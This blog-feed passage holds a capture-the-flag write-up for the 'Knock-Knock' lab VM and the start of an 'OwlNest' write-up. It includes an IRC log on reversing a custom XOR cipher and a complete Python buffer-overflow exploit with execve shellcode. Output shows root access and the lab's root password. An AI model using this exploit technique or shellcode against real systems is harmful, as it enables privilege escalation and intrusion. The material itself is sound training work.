[2014-10-10T21:54:01+0100] <recrudesce> cos you can work out what ascii chars will relate to the correct hex values
[2014-10-10T21:54:04+0100] <recrudesce> was just a thought
[2014-10-10T21:54:18+0100] <c0ne> hmm it was not intended
[2014-10-10T21:54:36+0100] <recrudesce> so if i needed a binary that was 3161 3161
[2014-10-10T21:54:42+0100] <recrudesce> i can just encrypt a1a1
[2014-10-10T21:54:52+0100] <recrudesce> and it&rsquo;ll create me a output with hex 3161 3161
[2014-10-10T21:54:58+0100] <recrudesce> just chmod +x it and run it
[2014-10-10T21:55:07+0100] <recrudesce> i guess i could work out what chars would result in the required hex.
[2014-10-10T21:55:12+0100] <recrudesce> then encrypt that to generate the binary
[2014-10-10T21:55:24+0100] <c0ne> could i push you allite bit ahead?
[2014-10-10T21:55:30+0100] <c0ne> into some other road..
[2014-10-10T21:55:35+0100] <recrudesce> but what&rsquo;s the point, cos i am only able to run that as jason
[2014-10-10T21:55:42+0100] <recrudesce> so, it&rsquo;s something to do with xcrypt
[2014-10-10T21:55:55+0100] <recrudesce> need to send something to xcrypt to make it create, or execute something
[2014-10-10T21:55:57+0100] <c0ne> its a kinda classic vuln&hellip;
[2014-10-10T21:56:11+0100] <recrudesce> so either buffer overflow or formatstr
[2014-10-10T21:56:16+0100] <recrudesce> please dont let it be formatstr
[2014-10-10T21:56:19+0100] <c0ne> first one
[2014-10-10T21:56:22+0100] <c0ne> simple bof
[2014-10-10T21:56:27+0100] <c0ne> but&hellip;
[2014-10-10T21:56:55+0100] <c0ne> you need to figure out this xcrypt in order to be able to encrypt your payload
[2014-10-10T21:57:47+0100] <c0ne> also regarding
[2014-10-10T21:57:48+0100] <c0ne> [22:52] <recrudesce> i see that the encryption changes based on the length
[2014-10-10T21:57:55+0100] <c0ne> yes and no&hellip;
[2014-10-10T21:58:12+0100] <c0ne> the key will change depending on the length
[2014-10-10T22:03:01+0100] <c0ne> basically it&rsquo;s a four byte key created from some init values and changes every time after crypting 4 bytes
[2014-10-10T22:03:56+0100] <recrudesce> i can make it  segfault by passing it 1000 a&rsquo;s
[2014-10-10T22:04:00+0100] <recrudesce> but only on the box
[2014-10-10T22:04:02+0100] <recrudesce> not on my kali
[2014-10-10T22:05:57+0100] <c0ne> 1000 a&rsquo;s kinda suprisses me
[2014-10-10T22:06:09+0100] <c0ne> since the buffer is bigger
[2014-10-10T22:06:21+0100] <recrudesce> i seg faulted it on 1000 a&rsquo;s
[2014-10-10T22:06:45+0100] <c0ne> k
[2014-10-10T22:06:51+0100] <c0ne> try something like 5000
[2014-10-10T22:08:26+0100] <recrudesce> ok, i made it crash
[2014-10-10T22:08:43+0100] <recrudesce> 725cce63
[2014-10-10T22:08:48+0100] <recrudesce> but it&rsquo;s not in the pattern cos it&rsquo;s encrypting it
[2014-10-10T22:08:56+0100] <c0ne> exactly
[2014-10-10T22:11:35+0100] <recrudesce> you&rsquo;re evil
[2014-10-10T22:11:45+0100] <c0ne> motherless child
[2014-10-10T22:12:15+0100] <recrudesce> is the original key based off a static init value
[2014-10-10T22:12:17+0100] <recrudesce> or a dynamic one
[2014-10-10T22:12:24+0100] <c0ne> static
[2014-10-10T22:12:26+0100] <c0ne> also
[2014-10-10T22:12:31+0100] <recrudesce> so the first key is always the same
[2014-10-10T22:12:33+0100] <c0ne> xcrypt is one way
[2014-10-10T22:12:49+0100] <c0ne> so it either encrypts or decrypts
[2014-10-10T22:14:10+0100] <c0ne> basicly what is does it
[2014-10-10T22:14:53+0100] <c0ne> creates a 4byte key(dword) crypts a block of 4 bytes(dword) and then changes the key based on another static value
[2014-10-10T22:15:18+0100] <c0ne> and its keeps changing for every loop round
[2014-10-10T22:15:47+0100] <recrudesce> so essentially the key is the same on first loop
[2014-10-10T22:15:52+0100] <recrudesce> and same on 2nd loop ?
[2014-10-10T22:15:56+0100] <c0ne> also on the next
[2014-10-10T22:16:00+0100] <c0ne> and so on&hellip;
[2014-10-10T22:16:06+0100] <recrudesce> so no matter what i send it length wise, the 1st key is ALWAYS the same
[2014-10-10T22:16:09+0100] <recrudesce> and so is the 2nd key
[2014-10-10T22:16:12+0100] <c0ne> its a simple math mutation
[2014-10-10T22:16:21+0100] <recrudesce> gotta work out how you generate the 2nd key
[2014-10-10T22:16:27+0100] <recrudesce> work out what the first key is too
[2014-10-10T22:16:41+0100] <c0ne> there is only one key
[2014-10-10T22:16:41+0100] <recrudesce> then you can work out what the algorithm is to generate the keys
[2014-10-10T22:16:47+0100] <recrudesce> yeah, but you mutate it
[2014-10-10T22:16:53+0100] <c0ne> thats exactly what you need to do
[2014-10-10T22:17:16+0100] <c0ne> see how the key is build and mutates
[2014-10-10T22:18:28+0100] <recrudesce> v3 is the key
[2014-10-10T22:18:35+0100] <recrudesce> in pseudo-c
[2014-10-10T22:18:49+0100] <recrudesce> v3 = -367349345
[2014-10-10T22:19:00+0100] <c0ne> make it hex please
[2014-10-10T22:20:52+0100] <recrudesce> -0x15E54E61
[2014-10-10T22:21:24+0100] <c0ne> yeah i just checked it
[2014-10-10T22:21:30+0100] <c0ne> its the init value indeed
[2014-10-10T22:21:47+0100] <recrudesce> ok, so the first key is 0x15E54E61 ?
[2014-10-10T22:21:53+0100] <recrudesce> represented as an unsigned int
[2014-10-10T22:21:58+0100] <c0ne> no
[2014-10-10T22:22:05+0100] <c0ne> unsigned indeed
[2014-10-10T22:22:11+0100] <c0ne> you show signed now
[2014-10-10T22:22:57+0100] <recrudesce> ah, so signed -367349345 (15E54E61) is EA1AB19F unsigned ?
[2014-10-10T22:23:04+0100] <c0ne> yes
[2014-10-10T22:23:06+0100] <c0ne> in ida
[2014-10-10T22:23:09+0100] <c0ne> press h
[2014-10-10T22:23:16+0100] <c0ne> when the value selected iirc
[2014-10-10T22:24:48+0100] <recrudesce> but it shows 3927617951, not -367349345
[2014-10-10T22:24:54+0100] <recrudesce> or am i being stupid ?
[2014-10-10T22:25:05+0100] <c0ne> and when you press h again
[2014-10-10T22:25:19+0100] <recrudesce> EA1AB19F
[2014-10-10T22:25:24+0100] <recrudesce> but why is the signed different ?
[2014-10-10T22:26:00+0100] <c0ne> it isnt
[2014-10-10T22:26:05+0100] <c0ne> its the same value
[2014-10-10T22:26:26+0100] <recrudesce> ok, i&rsquo;m confused
[2014-10-10T22:26:37+0100] <recrudesce> in decompiled it shows as -367349345
[2014-10-10T22:26:38+0100] <c0ne> open win calc
[2014-10-10T22:26:52+0100] <c0ne> trow -367349345 in
[2014-10-10T22:26:57+0100] <c0ne> and switch to hex
[2014-10-10T22:27:03+0100] <c0ne> you will see
[2014-10-10T22:27:22+0100] <recrudesce> FFFFFFFEA1AB19F
[2014-10-10T22:27:30+0100] <c0ne> set it to dword
[2014-10-10T22:27:38+0100] <c0ne> strips the left 32 bits
[2014-10-10T22:27:40+0100] <recrudesce> ah ok
[2014-10-10T22:27:42+0100] <recrudesce> yeah, sorry
[2014-10-10T22:28:12+0100] <recrudesce> so that&rsquo;s the key in hex which is used as the key for the first 4 bytes
[2014-10-10T22:28:28+0100] <recrudesce> then something is happening to that hex value to make the next key
[2014-10-10T22:28:30+0100] <c0ne> its the base value indeed
[2014-10-10T22:28:35+0100] <c0ne> yes
[2014-10-10T22:29:31+0100] <recrudesce> ok, so it looks like you&rsquo;re putting that value into ebp+ -0Ch
[2014-10-10T22:30:25+0100] <recrudesce> looks like you&rsquo;re shifting it by 8
[2014-10-10T22:30:37+0100] <recrudesce> possibly ?
[2014-10-10T22:30:52+0100] <c0ne> more like shifting it by 1 , 8 times
[2014-10-10T22:31:21+0100] <recrudesce> what&rsquo;s the difference between shifting it by 1 8 times or shifting it by 8
[2014-10-10T22:32:42+0100] <c0ne> a2 >> 2
[2014-10-10T22:32:48+0100] <c0ne> is the same as
[2014-10-10T22:32:52+0100] <c0ne> a2 / 4
[2014-10-10T22:33:09+0100] <recrudesce> ok
[2014-10-10T22:35:15+0100] <recrudesce> bitwise operations
[2014-10-10T22:35:24+0100] <c0ne> yes
[2014-10-10T22:37:29+0100] <recrudesce> so this key, is it used as hex ?
[2014-10-10T22:37:36+0100] <recrudesce> or converted to something before use ?
[2014-10-10T22:38:28+0100] <c0ne> hex is only a presentation
[2014-10-10T22:38:41+0100] <c0ne> if you get me?
[2014-10-10T22:38:46+0100] <recrudesce> yeah
[2014-10-10T22:38:58+0100] <recrudesce> i&rsquo;m just trying to work out how this xcrypt works
[2014-10-10T22:38:59+0100] <c0ne> its 32 bits value
[2014-10-10T22:40:14+0100] <c0ne> in assembly you cant realy determ how the value is intended
[2014-10-10T22:40:31+0100] <c0ne> signed or unsigned
[2014-10-10T22:40:45+0100] <c0ne> ah signed value ranges from 0 till 80000000
[2014-10-10T22:41:00+0100] <c0ne> where a unsigned ranges from 0 to ffffffff
[2014-10-10T22:42:59+0100] <recrudesce> i&rsquo;m still trying to fathom out this xcrypt func
[2014-10-10T22:43:06+0100] <c0ne> normally the code kinda tells you how the value was intended
[2014-10-10T22:43:10+0100] <recrudesce> so it&rsquo;s taking file size, dividing by 4
[2014-10-10T22:43:13+0100] <recrudesce> looping that many times
[2014-10-10T22:43:30+0100] <recrudesce> <em>(_DWORD </em>)(a1 + 4 * i) = v3 ^ <em>(_DWORD </em>)(4 * i + a1);
[2014-10-10T22:43:40+0100] <recrudesce> for ( j = 0; j &lt;= 7; ++j )
[2014-10-10T22:43:49+0100] <recrudesce> {
[2014-10-10T22:43:49+0100] <recrudesce>       if ( v3 &amp; 1 )
[2014-10-10T22:43:49+0100] <recrudesce>         v3 = ((unsigned int)v3 >> 1) ^ 0x6DAA1CF4;
[2014-10-10T22:43:49+0100] <recrudesce>       else
[2014-10-10T22:43:49+0100] <recrudesce>         v3 = (unsigned int)v3 >> 1;
[2014-10-10T22:43:49+0100] <recrudesce>     }
[2014-10-10T22:43:49+0100] <recrudesce>   }
[2014-10-10T22:44:02+0100] <c0ne> hmm dress up you ida abit more
[2014-10-10T22:44:07+0100] <c0ne> for example
[2014-10-10T22:44:21+0100] <c0ne> select a1 and press y
[2014-10-10T22:44:25+0100] <c0ne> and change it to
[2014-10-10T22:44:32+0100] <c0ne> <em>DWORD *a1
[2014-10-10T22:44:40+0100] <recrudesce> hang on, i need to find a1
[2014-10-10T22:44:53+0100] <c0ne> in the function params
[2014-10-10T22:44:58+0100] <c0ne> int __cdecl xcrypt(</em>DWORD <em>a1, unsigned int a2)
[2014-10-10T22:45:13+0100] <recrudesce> my pseudocode is in a file
[2014-10-10T22:45:27+0100] <c0ne> aah that wont help then
[2014-10-10T22:45:31+0100] <recrudesce> ok, now it&rsquo;s in ida
[2014-10-10T22:45:35+0100] <c0ne> since the rest isnt changed then
[2014-10-10T22:46:07+0100] <recrudesce> ok, so i did that
[2014-10-10T22:46:32+0100] <c0ne> [23:43] <recrudesce> </em>(<em>DWORD <em>)(a1 + 4 * i) = v3 ^ </em>(</em>DWORD *)(4 * i + a1);
[2014-10-10T22:46:38+0100] <recrudesce> now shows as a1[1] ^= v3
[2014-10-10T22:46:39+0100] <c0ne> that looks abit better now i think?
[2014-10-10T22:46:40+0100] <c0ne> yes
[2014-10-10T22:46:46+0100] <c0ne> hmm
[2014-10-10T22:46:57+0100] <c0ne> now shows as a1[1] ^= v3 that a 1? in the array?
[2014-10-10T22:47:06+0100] <recrudesce> sorry, i
[2014-10-10T22:47:11+0100] <c0ne> k
[2014-10-10T22:47:12+0100] <recrudesce> a1[i]
[2014-10-10T22:47:14+0100] <c0ne> i was worried
[2014-10-10T22:47:31+0100] <c0ne> name that v3 key or so
[2014-10-10T22:47:39+0100] <c0ne> select > n ..
[2014-10-10T22:48:03+0100] <recrudesce> name it to &ldquo;key&rdquo; ?
[2014-10-10T22:48:11+0100] <c0ne> yeah or whatever
[2014-10-10T22:48:16+0100] <c0ne> origenaly its called k
[2014-10-10T22:48:16+0100] <recrudesce> ok, done
[2014-10-10T22:48:28+0100] <c0ne> make its sometimes easier to read the whole thing
[2014-10-10T22:48:53+0100] <recrudesce> k is already in use it seems
[2014-10-10T22:49:10+0100] <c0ne> then use key :P
[2014-10-10T22:49:15+0100] <recrudesce> yeah, done it
[2014-10-10T22:49:53+0100] <recrudesce> {
[2014-10-10T22:49:53+0100] <recrudesce>       if ( v3 &amp; 1 )
[2014-10-10T22:49:53+0100] <recrudesce>         v3 = ((unsigned int)v3 >> 1) ^ 0x6DAA1CF4;
[2014-10-10T22:49:53+0100] <recrudesce>       else
[2014-10-10T22:49:53+0100] <recrudesce>         v3 = (unsigned int)v3 >> 1;
[2014-10-10T22:49:53+0100] <recrudesce>     }
[2014-10-10T22:49:53+0100] <recrudesce>   }
[2014-10-10T22:49:59+0100] <c0ne> so with the last bit of code stripped
[2014-10-10T22:50:05+0100] <c0ne> its kinda looks simple right?
[2014-10-10T22:50:08+0100] <recrudesce> yup, that&rsquo;s what i have
[2014-10-10T22:50:34+0100] <c0ne> so for every loop 0..7 it does a math check on the last key value
[2014-10-10T22:50:37+0100] <c0ne> the and 1
[2014-10-10T22:50:50+0100] <c0ne> and so chooses how the mutate the key
[2014-10-10T22:51:28+0100] <c0ne> try porting this into python or what you like
[2014-10-10T22:53:13+0100] <recrudesce> cant i just do this in C and make it echo the keys ?
[2014-10-10T22:53:22+0100] <c0ne> sure
[2014-10-10T22:53:26+0100] <recrudesce> rather than return 0, printf(key) ?
[2014-10-10T22:53:38+0100] <c0ne> but python is just as easy
[2014-10-10T22:53:45+0100] <c0ne> hmm now sure if you want that
[2014-10-10T22:53:51+0100] <c0ne> but yes i think is possible
[2014-10-10T22:54:02+0100] <recrudesce> ok, lets work this through in python
[2014-10-10T22:54:03+0100] <c0ne> but you will flood your screen
[2014-10-10T22:55:32+0100] <recrudesce> ok, so a1 is the content of the file
[2014-10-10T22:55:37+0100] <recrudesce> and a2 is the length of the file ?
[2014-10-10T22:55:38+0100] <c0ne> yes
[2014-10-10T22:55:41+0100] <c0ne> yes
[2014-10-10T22:56:56+0100] <recrudesce> ok, so i need to pass my python script a file
[2014-10-10T22:57:01+0100] <recrudesce> get the contents of it
[2014-10-10T22:57:04+0100] <recrudesce> and the length
[2014-10-10T22:57:56+0100] <c0ne> thats a way indeed
[2014-10-10T22:58:14+0100] <c0ne> easier is to generate the data youself
[2014-10-10T22:58:25+0100] <c0ne> data = 5000 * &lsquo;A&rsquo;
[2014-10-10T22:59:05+0100] <recrudesce> ok, so a1 = 5000 * &lsquo;A&rsquo;
[2014-10-10T22:59:07+0100] <recrudesce> a2 = 5000
[2014-10-10T22:59:19+0100] <recrudesce> key = -367349345
[2014-10-10T22:59:41+0100] <c0ne> go for the signed
[2014-10-10T22:59:47+0100] <c0ne>         key = ((unsigned int)key >> 1) ^ 0x6DAA1CF4;
[2014-10-10T22:59:47+0100] <c0ne>       else
[2014-10-10T22:59:47+0100] <c0ne>         key = (unsigned int)key >> 1;
[2014-10-10T22:59:54+0100] <c0ne> sorry unsigned
[2014-10-10T23:00:02+0100] <c0ne> the code tells you how its intended
[2014-10-10T23:15:14+0100] <recrudesce> so i have
[2014-10-10T23:15:22+0100] <recrudesce> key = 0xEA1AB19F
[2014-10-10T23:15:35+0100] <recrudesce> for i in range (0,a2/4,1) :
[2014-10-10T23:15:44+0100] <recrudesce>      print a1[i] ^ key
[2014-10-10T23:15:48+0100] <recrudesce> throws an error
[2014-10-10T23:15:56+0100] <recrudesce> TypeError: unsupported operand type(s) for ^: &lsquo;str&rsquo; and &lsquo;long&rsquo;
[2014-10-10T23:15:57+0100] <c0ne> yeah of course
[2014-10-10T23:16:02+0100] <c0ne> exactly
[2014-10-10T23:16:02+0100] <recrudesce> so i guess i have to cast key as long ?
[2014-10-10T23:16:07+0100] <c0ne> no
[2014-10-10T23:16:20+0100] <c0ne> your data, you don&rsquo;t treat is a integer
[2014-10-10T23:16:24+0100] <recrudesce> or cast my string as long ?
[2014-10-10T23:16:26+0100] <c0ne> str xor integer
[2014-10-10T23:16:50+0100] <c0ne> struct lib can help you
[2014-10-10T23:17:02+0100] <recrudesce> so i need to work out how to convert my string to an int
[2014-10-10T23:17:08+0100] <recrudesce> convert an A to an int :/
[2014-10-10T23:17:42+0100] <c0ne> x = struct.unpack_from(&lsquo;&lt;L&rsquo;, a1, (i * 4))
[2014-10-10T23:17:43+0100] <c0ne> or so
[2014-10-10T23:17:47+0100] <c0ne> in the loop
[2014-10-10T23:18:22+0100] <recrudesce> <L ?
[2014-10-10T23:18:46+0100] <c0ne> little endian indeed
[2014-10-10T23:19:07+0100] <recrudesce> ok, so now i get tuple and long
[2014-10-10T23:19:21+0100] <c0ne> sorry
[2014-10-10T23:19:22+0100] <recrudesce> rather than string and long :P
[2014-10-10T23:19:25+0100] <c0ne>  x = struct.unpack_from(&lsquo;&lt;L&rsquo;, a1, (i * 4))[0]
[2014-10-10T23:19:27+0100] <c0ne> better
[2014-10-10T23:19:50+0100] <recrudesce> ah ok
[2014-10-10T23:19:52+0100] <recrudesce> cool
[2014-10-10T23:20:06+0100] <c0ne> btw
[2014-10-10T23:20:07+0100] <c0ne> for i in range (0,a2/4,1) :
[2014-10-10T23:20:14+0100] <c0ne> how does this works?
[2014-10-10T23:20:21+0100] <recrudesce> a2 is the length
[2014-10-10T23:20:23+0100] <recrudesce> 0 is start
[2014-10-10T23:20:26+0100] <recrudesce> 1 is step
[2014-10-10T23:20:29+0100] <c0ne> aah ok
[2014-10-10T23:20:34+0100] <recrudesce> so it&rsquo;ll step 1 from 0 to a2/4
[2014-10-10T23:20:43+0100] <c0ne> which is the same as
[2014-10-10T23:20:46+0100] <recrudesce> which is essentially what you&rsquo;re doing with v
[2014-10-10T23:20:47+0100] <recrudesce>  for ( i = 0; a2 >> 2 > i; ++i )
[2014-10-10T23:20:52+0100] <c0ne> range(a2/4)
[2014-10-10T23:20:58+0100] <recrudesce> yeah, could do that too
[2014-10-10T23:21:04+0100] <c0ne> it confused me
[2014-10-10T23:21:57+0100] <recrudesce> if ( key &amp; 1 )
[2014-10-10T23:22:00+0100] <recrudesce> wossat doing ?
[2014-10-10T23:22:22+0100] <c0ne> check a bit is true or false
[2014-10-10T23:22:22+0100] <recrudesce> bitwise and
[2014-10-10T23:23:33+0100] <c0ne> >>> for i in range(10):
[2014-10-10T23:23:34+0100] <c0ne> &hellip;     print (i &amp; 1)
[2014-10-10T23:23:34+0100] <c0ne> &hellip;
[2014-10-10T23:23:34+0100] <c0ne> 0
[2014-10-10T23:23:34+0100] <c0ne> 1
[2014-10-10T23:23:34+0100] <c0ne> 0
[2014-10-10T23:23:34+0100] <c0ne> 1
[2014-10-10T23:23:35+0100] <c0ne> 0
[2014-10-10T23:23:35+0100] <c0ne> 1
[2014-10-10T23:23:36+0100] <c0ne> 0
[2014-10-10T23:23:36+0100] <c0ne> 1
[2014-10-10T23:23:37+0100] <c0ne> 0
[2014-10-10T23:23:37+0100] <c0ne> 1
[2014-10-10T23:28:36+0100] <c0ne> now there where you do
[2014-10-10T23:28:37+0100] <c0ne> print x ^ key
[2014-10-10T23:28:59+0100] <c0ne> you could pack the result into a str again and append it to some output buffer
[2014-10-10T23:29:17+0100] <c0ne> something like
[2014-10-10T23:29:21+0100] <c0ne> outside the loop
[2014-10-10T23:29:24+0100] <c0ne> r = &lsquo;&rsquo;
[2014-10-10T23:29:50+0100] <recrudesce> outside which loop - the first or the 2nd ?
[2014-10-10T23:29:52+0100] <c0ne> replace the print with r += struct.pack(&lsquo;&lt;L&rsquo;, (x ^ key))
[2014-10-10T23:30:14+0100] <c0ne> out of the main loop
[2014-10-10T23:30:23+0100] <c0ne> since you have the declare a clean buffer
[2014-10-10T23:30:26+0100] <c0ne> empty
[2014-10-10T23:31:10+0100] <recrudesce> ok, done
[2014-10-10T23:31:18+0100] <recrudesce> then at the end, print r ?
[2014-10-10T23:31:22+0100] <recrudesce> after the entire loop
[2014-10-10T23:31:23+0100] <c0ne> yes
[2014-10-10T23:31:27+0100] <c0ne> or!
[2014-10-10T23:31:42+0100] <c0ne> open(&lsquo;myfile.tfc&rsquo;, &lsquo;wb&rsquo;).write( r )
[2014-10-10T23:31:52+0100] <c0ne> so you have it in the file
[2014-10-10T23:32:11+0100] <c0ne> you need it in a file anyways
[2014-10-10T23:32:26+0100] <recrudesce> ok, i just encrypted 5000 A&rsquo;s
[2014-10-10T23:32:36+0100] <recrudesce> and it looks like it did it
[2014-10-10T23:33:00+0100] <c0ne> feed it to the binary
[2014-10-10T23:33:06+0100] <c0ne> and see what happens
[2014-10-10T23:33:21+0100] <recrudesce> seg fault
[2014-10-10T23:33:32+0100] <c0ne> on..
[2014-10-10T23:34:01+0100] <recrudesce> 0x4f04c41c
[2014-10-10T23:34:14+0100] <c0ne> hmm
[2014-10-10T23:34:21+0100] <c0ne> try 6000 A
[2014-10-10T23:34:25+0100] <c0ne> for a test
[2014-10-10T23:34:41+0100] <c0ne> the original buffer is 4096
[2014-10-10T23:34:50+0100] <c0ne> now that very close to that 5000
[2014-10-10T23:35:26+0100] <c0ne> ooh btw
[2014-10-10T23:35:33+0100] <c0ne> i see a bug in your code
[2014-10-10T23:35:42+0100] <c0ne> for ( j = 0; j &lt;= 7; ++j )
[2014-10-10T23:35:48+0100] <c0ne> 0 ..7 is 8
[2014-10-10T23:35:50+0100] <c0ne> rounds
[2014-10-10T23:35:56+0100] <c0ne> for j in range(7):
[2014-10-10T23:36:00+0100] <c0ne> this is 7 rounds
[2014-10-10T23:36:29+0100] <c0ne> j &lt;= 7
[2014-10-10T23:36:35+0100] <c0ne> less or equal
[2014-10-10T23:36:47+0100] <recrudesce> but it starts at 0
[2014-10-10T23:36:49+0100] <c0ne> if it did j &lt; 7 it would be 7 rounds
[2014-10-10T23:37:07+0100] <recrudesce> so i need to do 6 then
[2014-10-10T23:37:13+0100] <c0ne> no
[2014-10-10T23:37:17+0100] <c0ne> 8
[2014-10-10T23:37:23+0100] <c0ne> for j in range(8)
[2014-10-10T23:37:36+0100] <c0ne> that will go from 0 .. up till 7
[2014-10-10T23:37:40+0100] <c0ne> which is 8 rounds
[2014-10-10T23:37:49+0100] <c0ne> since the 0 counts to
[2014-10-10T23:38:09+0100] <recrudesce> segfault at 41414141
[2014-10-10T23:38:09+0100] <recrudesce> nice
[2014-10-10T23:38:25+0100] <c0ne> now from here on i made it easy
[2014-10-10T23:38:30+0100] <c0ne> exec stack
[2014-10-10T23:38:38+0100] <c0ne> and even added some little helper
[2014-10-10T23:40:14+0100] <recrudesce> so it&rsquo;s one way encryption
[2014-10-10T23:40:19+0100] <recrudesce> but you can encrypt encrypted files to decrypt
[2014-10-10T23:40:23+0100] <recrudesce> hahaha
[2014-10-10T23:40:26+0100] <c0ne> yes
[2014-10-10T23:40:27+0100] <c0ne> xor
[2014-10-10T23:40:36+0100] <c0ne> with a key mutation
[2014-10-10T23:40:53+0100] <c0ne> if i used a static key of for example 16 bytes
[2014-10-10T23:41:06+0100] <c0ne> you could see some pattern in the encrypted data
[2014-10-10T23:41:14+0100] <c0ne> kinda revealing the key
[2014-10-10T23:41:24+0100] <c0ne> so that why added a bit of math
[2014-10-10T23:43:04+0100] <c0ne> you can also make it leak the key
[2014-10-10T23:43:12+0100] <c0ne> feed it a file with 00 bytes
[2014-10-10T23:45:34+0100] <recrudesce> eip is at 4124
[2014-10-10T23:46:29+0100] <c0ne> yes
[2014-10-10T23:48:06+0100] <recrudesce> ok, have control of EIP
[2014-10-10T23:49:35+0100] <c0ne> now whats next ..
[2014-10-10T23:50:04+0100] <recrudesce> ok, so ret2lib i guess ?
[2014-10-10T23:50:13+0100] <c0ne> naah
[2014-10-10T23:50:16+0100] <c0ne> even more simple
[2014-10-10T23:50:29+0100] <c0ne> stack is executable
[2014-10-10T23:50:38+0100] <c0ne> no need for fancy rops
[2014-10-10T23:50:40+0100] <recrudesce> jump to esp
[2014-10-10T23:50:46+0100] <c0ne> yeah
[2014-10-10T23:52:15+0100] <c0ne> msfelfscan -j esp binaryfile
[2014-10-10T23:53:55+0100] <c0ne> asm (&ldquo;jmp %esp&rdquo;);
[2014-10-10T23:54:00+0100] <c0ne> added it on purpose
[2014-10-10T23:54:06+0100] <c0ne> i&rsquo;m not that evil
[2014-10-10T23:57:50+0100] <c0ne> since there isnt any more tricks down the way
[/plain]</p>

<p>So, now that you read that, this is what my Python script looks like</p>

<p>[python]</p>

<h1>!/bin/python</h1>

<p>import sys
import struct</p>

<h1>a1 = file contents</h1>

<h1>a2 = file length</h1>

<h1>f = open(&lsquo;input_buff.tfc&rsquo;, &lsquo;r&rsquo;)</h1>

<h1>a1 = f.read()</h1>

<h1>a2 = len(a1)</h1>

<p>ret = &lsquo;\x93\x8e\x04\x08&rsquo; #08048d93
shellcode = &ldquo;\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43&rdquo;
a1 = &lsquo;A&rsquo;*4124 + ret + &lsquo;\x90&rsquo; * 10 + shellcode
l = len(a1) % 4
for m in range(l):
        a1 += &lsquo;Z&rsquo;</p>

<p>a2 = len(a1)</p>

<p>key = 0xEA1AB19F
r=&lsquo;&rsquo;</p>

<h1>now do the first for loop</h1>

<p>for i in range(a2/4):
        x = struct.unpack_from(&lsquo;&lt;L&rsquo;, a1, (i * 4))[0]
        #print x ^ key
        r += struct.pack(&lsquo;&lt;L&rsquo;, (x ^ key))
        for j in range(8):
                if (key &amp; 1):
                        key = (key >> 1) ^ 0x6DAA1Cf4
                else:
                        key = key >> 1
open(&lsquo;myfile.tfc&rsquo;, &lsquo;wb&rsquo;).write( r )
[/python]</p>

<p>This generates a .tfc file, which when provided to the tfc application &ldquo;decrypts&rdquo;, jumps to esp and executes the shellcode, dropping us to a shell.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
jason@knockknock:~$ python keyshow.py
jason@knockknock:~$ ./tfc ./myfile.tfc ./myfile_blah.tfc</p>

<h1>id</h1>

<p>uid=1000(jason) gid=1000(jason) euid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(jason)</p>

<h1>cd /root</h1>

<h1>ls -l</h1>

<p>total 16
-rw-r&ndash;r&ndash; 1 root root 1459 Oct 11 18:04 crpt.py
-rwxr-xr-x 1 root root 1027 Oct 10 18:19 server.py
-rwxr-xr-x 1 root root  119 Sep 26 12:10 start.sh
drwxr-xr-x 2 root root 4096 Oct 10 20:55 the_flag_is_in_here</p>

<h1>cd the_flag_is_in_here</h1>

<p>ls -l</p>

<h1>total 4</h1>

<p>-rw-r&ndash;r&ndash; 1 root root 895 Oct 10 20:55 qQcmDWKM5a6a3wyT.txt</p>

<h1>cat qQcmDWKM5a6a3wyT.txt</h1>

<hr />

<p>|  | <strong> </strong><strong>   </strong><strong>   </strong><strong> |  | </strong>         |  | <strong> </strong><strong>   </strong><strong>   </strong><strong> |  | </strong> /<em>   |
|  |/ //    \ /  _ _/ </em><strong>|  |/ /  </strong><em><strong><em> |  |/ //    \ /  _ _/ </em></strong>|  |/ /  |   |
|    &lt;|   |  (  <_> )  _<strong>|    &lt;  /</strong></em><strong>/ |    &lt;|   |  (  <_> )  _</strong>|    &lt;   |   |
|<strong>|_ _</strong>|  /_<em><strong>/ _</strong>  >__|</em> \         |<strong>|_ _</strong>|  /_<em><strong>/ _</strong>  >__|</em> \  |___|
     \/    \/            \/     \/              \/    \/            \/     \/</p>

<p>Hooray you got the flag!</p>

<p>Hope you had as much fun r00ting this as I did making it!</p>

<p>Feel free to hit me up in #vulnhub @ zer0w1re</p>

<p>Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM :)</p>

<p>root password is &ldquo;qVx4UJ*zcUdc9#3C$Q&rdquo;, but you should already have a shell, right? ;)
#
[/plain]</p>

<p><img src="http://halloffamejay.com/wp-content/uploads/2013/10/muppet.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Owl Up In My Grill]]></title>
    <link href="http://recrudesce.github.io/blog/2014/10/26/owl-up-in-my-grill/"/>
    <updated>2014-10-26T17:16:50+00:00</updated>
    <id>http://recrudesce.github.io/blog/2014/10/26/owl-up-in-my-grill</id>
    <content type="html"><![CDATA[<p>So, while we were all sitting in #vulnhub (on Freenode) waiting for<a href="https://twitter.com/superkojiman">superkojiman</a> to release Persistence, <a href="https://twitter.com/swappage">Swappage</a> released <a href="vulnhub.com/entry/owlnest-102,102/">OwlNest</a>. I thought, what the hell, might as well use it to pass the time, right ? I was, however, not expecting it to take me 4 days&hellip;</p>

<!-- more -->


<h2>Were You Born in a Barn (Owl) ?</h2>

<p>A quick dig around using NMAP</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:/var/www# nmap -sS -O -p1-65535 &ndash;script banner 172.16.56.131 -P0</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-09-01 22:49 BST
Nmap scan report for 172.16.56.131
Host is up (0.00034s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
|<em>banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
80/tcp    open  http
111/tcp   open  rpcbind
31337/tcp open  Elite
| banner: (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)\x0D\x
|</em>0A        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\&hellip;
34895/tcp open  unknown
MAC Address: 00:0C:29:9A:51:B8 (VMware)
Device type: general purpose
